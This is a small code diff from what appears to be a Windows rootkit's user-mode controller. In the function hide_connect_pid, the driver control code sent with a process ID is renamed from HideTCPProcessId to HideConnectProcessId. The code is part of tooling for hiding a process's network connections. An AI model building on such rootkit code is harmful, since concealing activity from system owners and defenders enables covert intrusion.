@@ -153,7 +153,7 @@ BOOL Driver::DriverHandler::hide_connect_pid(const char* message)
 
 		BOOL bRet = DeviceIoControl(
 			device_handle_,
-			static_cast<DWORD>(Driver::RookitIoctls::HideTCPProcessId),
+			static_cast<DWORD>(Driver::RookitIoctls::HideConnectProcessId),
 			pid,
 			(DWORD)strlen(pid),
 			nullptr,
